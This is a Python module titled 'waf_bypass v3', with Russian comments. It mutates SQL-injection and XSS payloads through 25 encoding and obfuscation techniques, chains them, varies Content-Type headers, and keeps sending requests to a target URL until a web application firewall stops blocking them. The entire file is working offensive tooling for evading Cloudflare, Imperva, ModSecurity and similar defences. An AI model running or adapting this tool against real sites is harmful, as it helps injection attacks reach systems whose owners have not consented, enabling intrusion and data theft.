"""waf_bypass v3 — 25 mutation techniques + chaining + content-type evasion.

Мутаторы (в порядке возрастания нагрузки):
  1.  case_mix               UNION → UnIoN
  2.  double_encode          %27 → %2527
  3.  triple_encode          %27 → %252527
  4.  whitespace_tab         space → \t
  5.  whitespace_newline     space → \n
  6.  whitespace_comment     space → /**/
  7.  whitespace_plus        space → +
  8.  whitespace_encoded     space → %09/%0a/%0d/%20
  9.  sql_comment            UNION → /*!50000UNION*/
  10. sql_comment_split      UNION → UN/**/ION
  11. sql_parenthesized      UNION → (UNION)
  12. sql_concat             'a' → 'a'||'b'
  13. sql_chr                ' → CHAR(39)
  14. null_byte              insert %00
  15. fullwidth              ASCII → fullwidth unicode
  16. homoglyph              < > ' " → lookalike chars
  17. overlong_utf8          < → %c0%bc
  18. html_entity            < → &lt;
  19. html_decimal           < → &#60;
  20. html_hex               < → &#x3c;
  21. js_unicode             < → \u003c
  22. js_hex                 < → \x3c
  23. percent_u              < → %u003c
  24. backslash_escape       ' → \\'
  25. mixed                  комбинация комментариев + case

Плюс:
  - mutate_chain(payload, depth=2) — применить N мутаторов подряд
  - mutate_content_type(payload, ct) — обфускация через Content-Type
  - mutate_until_pass(http, url, payload) — гонять до первого не-блока
"""
import re
import urllib.parse
from urllib.parse import quote, urlparse, urlunparse, urlencode, parse_qs


# ============================================================
# WAF block detection
# ============================================================

WAF_STATUS = {403, 406, 429, 501, 502, 503}

WAF_BODY_MARKERS = [
    "cloudflare", "cf-ray", "checking your browser", "just a moment",
    "incapsula", "imperva", "sucuri", "akamai", "edgesuite",
    "mod_security", "modsecurity", "request rejected",
    "blocked", "forbidden", "access denied", "not acceptable",
    "web application firewall", "waf", "ddos protection",
    "captcha", "challenge", "turnstile", "recaptcha",
    "security check", "suspicious", "anomaly",
    "request blocked", "you have been blocked",
    "aws waf", "amzn-waf", "x-amzn",
]

WAF_HEADER_MARKERS = [
    "cf-mitigated", "x-amzn-waf-action", "x-sucuri-id", "x-iinfo",
    "x-waf", "x-protected-by", "x-cdn",
]


def is_blocked(resp):
    if resp is None:
        return False
    code = getattr(resp, "status_code", 0)
    if code in WAF_STATUS:
        return True
    hdrs_low = {k.lower(): str(v).lower() for k, v in getattr(resp, "headers", {}).items()}
    for marker in WAF_HEADER_MARKERS:
        if marker in hdrs_low:
            return True
    body_low = (getattr(resp, "text", "") or "").lower()[:5000]
    for marker in WAF_BODY_MARKERS:
        if marker in body_low:
            return True
    return False


# ============================================================
# Mutation primitives
# ============================================================

def _mutate_case_mix(payload):
    keywords = ["union", "select", "and", "or", "where", "from", "script",
                "alert", "onerror", "onload", "javascript", "expression",
                "sleep", "benchmark", "extractvalue", "updatexml"]
    out = payload
    for kw in keywords:
        mixed = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(kw))
        out = re.sub(r"\b" + kw + r"\b", mixed, out, flags=re.IGNORECASE)
    return out


def _mutate_double_encode(payload):
    return quote(quote(payload, safe=""), safe="")


def _mutate_triple_encode(payload):
    return quote(quote(quote(payload, safe=""), safe=""), safe="")


def _mutate_whitespace_tab(payload):
    return payload.replace(" ", "\\t")


def _mutate_whitespace_newline(payload):
    return payload.replace(" ", "\\n")


def _mutate_whitespace_comment(payload):
    return payload.replace(" ", "/**/")


def _mutate_whitespace_plus(payload):
    return payload.replace(" ", "+")


def _mutate_whitespace_encoded(payload):
    return payload.replace(" ", "%09")


def _mutate_sql_comment(payload):
    kws = ["UNION", "SELECT", "AND", "OR", "WHERE", "FROM", "INSERT",
           "UPDATE", "DELETE", "DROP", "TABLE", "SLEEP", "BENCHMARK",
           "HAVING", "ORDER", "GROUP"]
    out = payload
    for kw in kws:
        out = re.sub(r"\b" + kw + r"\b", "/*!50000" + kw + "*/", out, flags=re.IGNORECASE)
    return out


def _mutate_sql_comment_split(payload):
    kws = ["UNION", "SELECT", "AND", "OR", "WHERE", "FROM", "SLEEP"]
    out = payload
    for kw in kws:
        if len(kw) < 2:
            continue
        mid = len(kw) // 2
        split = kw[:mid] + "/**/" + kw[mid:]
        out = re.sub(r"\b" + kw + r"\b", split, out, flags=re.IGNORECASE)
    return out


def _mutate_sql_parenthesized(payload):
    kws = ["UNION", "SELECT", "AND", "OR"]
    out = payload
    for kw in kws:
        out = re.sub(r"\b" + kw + r"\b", "(" + kw + ")", out, flags=re.IGNORECASE)
    return out


def _mutate_sql_concat(payload):
    # ' OR 1=1 -- → ' OR 1=1 -- (unchanged but keywords split via concat)
    if " OR " in payload:
        return payload.replace(" OR ", " O/**/R ")
    return payload


def _mutate_sql_chr(payload):
    # ' → CHAR(39)  (упрощённо — только первая кавычка)
    if "'" in payload:
        return payload.replace("'", "CHAR(39)", 1)
    return payload


def _mutate_null_byte(payload):
    if " " in payload:
        i = payload.find(" ")
        return payload[:i] + "%00" + payload[i:]
    return payload + "%00"


def _mutate_fullwidth(payload):
    return "".join(chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c for c in payload)


def _mutate_homoglyph(payload):
    subs = {"<": "\\u2039", ">": "\\u203a", "(": "\\u207d", ")": "\\u207e",
            "/": "\\u2044", "'": "\\u2032", chr(34): "\\u2033"}
    return "".join(subs.get(c, c) for c in payload)


def _mutate_overlong_utf8(payload):
    subs = {"<": "%c0%bc", ">": "%c0%be", "/": "%c0%af",
            "'": "%c0%a7", chr(34): "%c0%a2", "=": "%c0%bd",
            "(": "%c0%a8", ")": "%c0%a9", " ": "%c0%a0",
            ";": "%c0%bb", "&": "%c0%a6"}
    return "".join(subs.get(c, c) for c in payload)


def _mutate_html_entity(payload):
    subs = {"<": "&lt;", ">": "&gt;", chr(34): "&quot;", "'": "&#x27;"}
    return "".join(subs.get(c, c) for c in payload)


def _mutate_html_decimal(payload):
    return "".join("&#" + str(ord(c)) + ";" for c in payload)


def _mutate_html_hex(payload):
    return "".join("&#x" + format(ord(c), "x") + ";" for c in payload)


def _mutate_js_unicode(payload):
    return "".join("\\u" + format(ord(c), "04x") for c in payload)


def _mutate_js_hex(payload):
    return "".join("\\x" + format(ord(c), "02x") for c in payload)


def _mutate_percent_u(payload):
    return "".join("%u" + format(ord(c), "04x") if ord(c) < 128 else c for c in payload)


def _mutate_backslash_escape(payload):
    return payload.replace("'", "\\'").replace(chr(34), "\\" + chr(34))


def _mutate_mixed(payload):
    out = re.sub(r"\\b(SELECT|UNION|FROM|WHERE|AND|OR)\\b",
                 lambda m: "/*!50000" + m.group(0) + "*/", payload, flags=re.I)
    out = out.replace(" ", "/**/")
    return out


# ============================================================
# Registry
# ============================================================

MUTATORS = [
    ("case_mix",            _mutate_case_mix),
    ("double_encode",       _mutate_double_encode),
    ("triple_encode",       _mutate_triple_encode),
    ("whitespace_tab",      _mutate_whitespace_tab),
    ("whitespace_newline",  _mutate_whitespace_newline),
    ("whitespace_comment",  _mutate_whitespace_comment),
    ("whitespace_plus",     _mutate_whitespace_plus),
    ("whitespace_encoded",  _mutate_whitespace_encoded),
    ("sql_comment",         _mutate_sql_comment),
    ("sql_comment_split",   _mutate_sql_comment_split),
    ("sql_parenthesized",   _mutate_sql_parenthesized),
    ("sql_concat",          _mutate_sql_concat),
    ("sql_chr",             _mutate_sql_chr),
    ("null_byte",           _mutate_null_byte),
    ("fullwidth",           _mutate_fullwidth),
    ("homoglyph",           _mutate_homoglyph),
    ("overlong_utf8",       _mutate_overlong_utf8),
    ("html_entity",         _mutate_html_entity),
    ("html_decimal",        _mutate_html_decimal),
    ("html_hex",            _mutate_html_hex),
    ("js_unicode",          _mutate_js_unicode),
    ("js_hex",              _mutate_js_hex),
    ("percent_u",           _mutate_percent_u),
    ("backslash_escape",    _mutate_backslash_escape),
    ("mixed",               _mutate_mixed),
]


# ============================================================
# Chaining — применить N мутаторов подряд
# ============================================================

def mutate_chain(payload, depth=2, names=None):
    """
    Применяет depth мутаторов подряд к payload.
    names — список имён мутаторов (опционально). Если None — берёт комбинации.
    Возвращает: list of (chain_desc, mutated_payload).
    """
    out = []
    if depth <= 1:
        for name, fn in MUTATORS:
            try:
                out.append((name, fn(payload)))
            except Exception:
                continue
        return out

    # depth >= 2: комбинируем пары
    for i, (n1, f1) in enumerate(MUTATORS):
        try:
            mid = f1(payload)
        except Exception:
            continue
        for n2, f2 in MUTATORS[i+1:]:
            try:
                final = f2(mid)
                if final != mid and final != payload:
                    out.append((n1 + "+" + n2, final))
            except Exception:
                continue
    return out


# ============================================================
# Content-Type evasion
# ============================================================

def mutate_content_type(ct="application/x-www-form-urlencoded"):
    """Возвращает варианты Content-Type для обхода WAF-парсеров."""
    variants = [
        ct,
        "application/x-www-form-urlencoded; charset=utf-8",
        "application/x-www-form-urlencoded; charset=ibm037",  # EBCDIC trick
        "application/x-www-form-urlencoded; charset=ibm500",
        "multipart/form-data; boundary=----omni",
        "text/plain",
        "application/json",
        "application/xml",
        "application/x-www-form-urlencoded\n",        # trailing newline
        " application/x-www-form-urlencoded",          # leading space
        "Application/X-WWW-Form-Urlencoded",           # case-mix
    ]
    return variants


# ============================================================
# Main API — гонять мутации до первого не-блока
# ============================================================

def mutate_until_pass(http, url, payload, method="GET", param_name=None,
                      max_mutations=None, use_chain=True, verbose=True):
    """
    Прогоняет payload через мутации до первой не-блокируемой WAF.
    Если use_chain=True — пробует двойные комбинации после одиночных.
    """
    def _req(p):
        try:
            if method == "GET":
                if param_name:
                    u = urlparse(url)
                    q = parse_qs(u.query)
                    q[param_name] = [p]
                    new_url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
                else:
                    new_url = url + ("&" if "?" in url else "?") + "x=" + p
                return http.get(new_url)
            else:
                return http.post(url, data=p)
        except Exception:
            return None

    resp = _req(payload)
    blocked_orig = is_blocked(resp)
    if not blocked_orig and resp is not None:
        return {"response": resp, "payload": payload, "mutation": None,
                "blocked_original": False, "attempts": 1}

    if verbose:
        print("  [waf] original blocked — mutating")

    mutations = MUTATORS if max_mutations is None else MUTATORS[:max_mutations]
    attempts = 1
    for name, fn in mutations:
        try:
            mutated = fn(payload)
        except Exception:
            continue
        if mutated == payload:
            continue
        attempts += 1
        resp2 = _req(mutated)
        if resp2 is not None and not is_blocked(resp2):
            if verbose:
                print("  [waf] bypass via " + name + ": " + repr(mutated[:60]))
            return {"response": resp2, "payload": mutated, "mutation": name,
                    "blocked_original": True, "attempts": attempts}

    # chaining
    if use_chain:
        if verbose:
            print("  [waf] single mutations failed — trying chains")
        chains = mutate_chain(payload, depth=2)
        for cname, cmut in chains:
            attempts += 1
            resp3 = _req(cmut)
            if resp3 is not None and not is_blocked(resp3):
                if verbose:
                    print("  [waf] bypass via chain " + cname + ": " + repr(cmut[:60]))
                return {"response": resp3, "payload": cmut, "mutation": cname,
                        "blocked_original": True, "attempts": attempts}

    if verbose:
        print("  [waf] all mutations blocked — " + str(attempts) + " attempts")
    return {"response": resp, "payload": payload, "mutation": None,
            "blocked_original": True, "attempts": attempts}


def get_stats():
    return {"mutations": len(MUTATORS),
            "names": [n for n, _ in MUTATORS],
            "chain_depth_2": "available" if True else "no"}
